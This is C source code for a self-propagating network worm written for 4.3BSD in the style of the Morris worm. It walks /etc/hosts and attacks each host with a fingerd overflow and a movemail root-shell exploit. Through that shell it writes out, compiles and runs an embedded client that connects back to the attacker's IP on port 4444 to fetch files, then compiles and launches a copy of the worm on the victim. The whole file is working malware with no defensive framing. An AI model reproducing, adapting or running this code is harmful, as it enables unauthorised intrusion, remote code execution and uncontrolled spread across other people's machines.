#include "worm.h"
#include "worm_bsd.h"
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/wait.h>
#include <signal.h>
#include <netdb.h>
#include <stdio.h>

#define HOSTS_FILE "/etc/hosts"
#define MAX_IP_LEN 64

/* K&R Style function definition */
void get_local_ip(ip)
    char *ip;
{
    int sock;
    struct sockaddr_in serv_addr, local_addr;
    int len; /* socklen_t did not exist, use int */
    len = sizeof(local_addr);

    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        strcpy(ip, "127.0.0.1");
        return;
    }

    /* 4.3BSD uses bzero instead of memset */
    bzero((char *)&serv_addr, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(53);
    /* inet_pton did not exist, use inet_addr */
    serv_addr.sin_addr.s_addr = inet_addr("8.8.8.8");

    if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
        strcpy(ip, "127.0.0.1");
        close(sock);
        return;
    }

    if (getsockname(sock, (struct sockaddr *)&local_addr, &len) < 0) {
        strcpy(ip, "127.0.0.1");
        close(sock);
        return;
    }

    /* inet_ntoa returns a pointer to a static string */
    strcpy(ip, inet_ntoa(local_addr.sin_addr));
    close(sock);
}

void deploy_receive_file(sock, my_ip)
    int sock;
    char *my_ip;
{
    char cmd_buf[IO_BUF_SIZE];
    char *formatted_source;
    char *file_contents;
    
    formatted_source = (char *)malloc(10000); 
    if (formatted_source == (char *)0) return;

    /* Old C does not support const; using standard char pointer */
    file_contents = "#include <stdio.h>\n#include <sys/types.h>\n#include <sys/socket.h>\n#include <netinet/in.h>\n#include <sys/time.h>\n#define SERVER_IP \"%s\"\n#define SERVER_PORT 4444\n#define IO_BUF_SIZE 2048\nint send_int(num, fd) int num; int fd; { unsigned long conv = htonl((unsigned long)num); char *data = (char*)&conv; int left = sizeof(conv); int rc; do { rc = write(fd, data, left); if (rc < 0) return -1; else { data += rc; left -= rc; } } while (left > 0); return 0; }\nint receive_int(num, fd) int *num; int fd; { unsigned long ret; char *data = (char*)&ret; int left = sizeof(ret); int rc; do { rc = read(fd, data, left); if (rc <= 0) return -1; else { data += rc; left -= rc; } } while (left > 0); *num = ntohl(ret); return 0; }\nint main() { int i, j, n, server_sock, file_size, len, num_files; struct timeval tv; struct sockaddr_in serv_addr; char io_buf[IO_BUF_SIZE], path[256]; FILE *outfile; char *file_name; server_sock = socket(AF_INET, SOCK_STREAM, 0); if (server_sock < 0) return 1; bzero((char *)&serv_addr, sizeof(serv_addr)); serv_addr.sin_family = AF_INET; serv_addr.sin_port = htons(SERVER_PORT); serv_addr.sin_addr.s_addr = inet_addr(SERVER_IP); while (connect(server_sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) sleep(1); while (1) { write(server_sock, \"Hello from client!\\n\", 19); FD_ZERO(&read_fds); FD_SET(server_sock, &read_fds); tv.tv_sec = 5; tv.tv_usec = 0; if (select(server_sock + 1, &read_fds, (fd_set *)0, (fd_set *)0, &tv) > 0) { if (receive_int(&num_files, server_sock) < 0) continue; send_int(num_files, server_sock); for (i = 0; i < num_files; i++) { if (receive_int(&len, server_sock) < 0) continue; file_name = (char *)malloc((len + 1)); n = read(server_sock, file_name, len); file_name[n] = '\\0'; sprintf(path, \"/tmp/%%s\", file_name); outfile = fopen(path, \"w\"); if (receive_int(&file_size, server_sock) < 0) continue; while (file_size > 0) { n = read(server_sock, io_buf, IO_BUF_SIZE - 1); if (n > 0) { io_buf[n] = '\\0'; fputs(io_buf, outfile); } file_size -= n; } fclose(outfile); free(file_name); send_int(i, server_sock); } write(server_sock, \"Files recieved\\n\", 15); break; } } close(server_sock); return 0; }\n";

    sprintf(formatted_source, file_contents, my_ip);

    write_to_sock(sock, "cat > /tmp/receive_file.c << 'EOF'\n");
    write_to_sock(sock, formatted_source);
    write_to_sock(sock, "EOF\n");
    sleep(5);

    bzero(cmd_buf, IO_BUF_SIZE);
    read_from_sock(sock, cmd_buf, IO_BUF_SIZE);
    free(formatted_source);
}

void infect(ip, my_ip)
    char *ip;
    char *my_ip;
{
    int sock;
    struct sockaddr_in serv_addr;
    char buf[BUF_SIZE];
    char io_buf[IO_BUF_SIZE];
    char *argv[5];

    /* Initialize buffers with bzero */
    bzero(buf, BUF_SIZE);
    bzero(io_buf, IO_BUF_SIZE);

    printf("[*] Attempting to infect: %s\n", ip);
    fflush(stdout);

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return;

    create_sockaddr(&serv_addr, ip, FINGERD_PORT);

    if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
        close(sock);
        return;
    }

    create_exploit(buf, PAYLOAD, BUF_SIZE, PAYLOAD_LEN);
    write(sock, buf, BUF_SIZE);
    sleep(5);

    get_root_shell_via_movemail_exploit(sock, io_buf, IO_BUF_SIZE);
    sleep(5);

    deploy_receive_file(sock, my_ip);
    
    if (fork() == 0) {
        argv[0] = "send_file_over_socket_bsd";
        argv[1] = "worm_bsd.c";
        argv[2] = "worm_bsd.h";
        argv[3] = (char *)0;
        execv("./send_file_over_socket_bsd", argv);
        exit(1);
    }

    write_to_sock(sock, "cc /tmp/receive_file.c -o /tmp/receive_file\n");
    sleep(2);
    read_from_sock(sock, io_buf, IO_BUF_SIZE);
    
    /* Absolute path is safer in 4.3BSD shells */
    write_to_sock(sock, "/tmp/receive_file &\n");
    sleep(2);
    read_from_sock(sock, io_buf, IO_BUF_SIZE);

    write_to_sock(sock, "cc /tmp/worm.c -o /tmp/worm\n");
    sleep(2);
    read_from_sock(sock, io_buf, IO_BUF_SIZE);
    
    write_to_sock(sock, "/tmp/worm &\n");
    sleep(2);
    read_from_sock(sock, io_buf, IO_BUF_SIZE);

    close(sock);
}

int main()
{
    FILE *fp;
    char line[128];
    char ip[MAX_IP_LEN];
    char my_ip[MAX_IP_LEN];

    get_local_ip(my_ip);

    while (1) {
        fp = fopen(HOSTS_FILE, "r");
        if (fp == (FILE *)0) {
            sleep(25);
            continue;
        }

        while (fgets(line, 128, fp) != (char *)0) {
            if (line[0] == '#' || line[0] == '\n' || line[0] == ' ')
                continue;

            if (sscanf(line, "%s", ip) != 1)
                continue;

            if (strcmp(ip, "127.0.0.1") == 0)
                continue;
            if (strcmp(ip, my_ip) == 0)
                continue;

            infect(ip, my_ip);
            sleep(10);
        }
        fclose(fp);
    }
    return 0;
}